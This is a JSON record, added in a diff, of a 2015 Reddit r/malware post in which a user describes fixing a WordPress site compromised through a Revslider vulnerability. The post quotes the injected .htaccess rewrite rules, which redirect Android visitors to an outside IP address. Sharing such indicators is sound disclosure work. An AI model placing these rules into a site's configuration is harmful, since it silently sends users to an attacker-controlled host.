@@ -1,0 +1,21 @@
+{
+    "op": {
+        "upvote_ratio": null,
+        "selftext": "Someone hit it up and it installed this in .htaccess.\n\nOnly affected Android devices\n\n-----------------------------------------\n\nRewriteEngine on\n\nRewriteCond %{HTTP_USER_AGENT} \"android\" [NC]\n\nRewriteRule ^(.*)$ hxxp://176.102.34.137/safezone [L,R=302]\n",
+        "title": "Just fixed WordPress site w Revslider vuln on it",
+        "score": 12,
+        "id": "2xomg0",
+        "commsNum": 10,
+        "timeStamp": "2015/03/02-08:55:50",
+        "author_name": "ZeldaAddict",
+        "is_self": true,
+        "locked": null,
+        "num_comments": 10,
+        "over_18": false,
+        "spoiler": null,
+        "subreddit": "malware",
+        "stickied": false,
+        "url": "http://www.reddit.com/r/Malware/comments/2xomg0/just_fixed_wordpress_site_w_revslider_vuln_on_it/"
+    },
+    "posts": {}
+}
